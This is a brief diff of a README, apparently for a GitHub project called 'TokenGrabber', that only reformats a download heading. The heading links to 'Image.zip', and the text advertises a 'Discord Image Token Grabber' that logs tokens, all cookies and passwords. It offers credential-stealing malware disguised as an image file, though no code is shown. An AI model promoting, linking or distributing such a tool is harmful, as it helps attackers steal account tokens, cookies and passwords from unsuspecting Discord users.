@@ -1,4 +1,4 @@
-### - Download -> [Image.zip](https://github.com/q7ix/TokenGrabber/files/9173762/Image.zip)
+### Download -> [Image.zip](https://github.com/q7ix/TokenGrabber/files/9173762/Image.zip)
 
 - Discord Image Token Grabber By Ca$H 
 - Image Token Logger Token Grabber All Cookies & Passwords
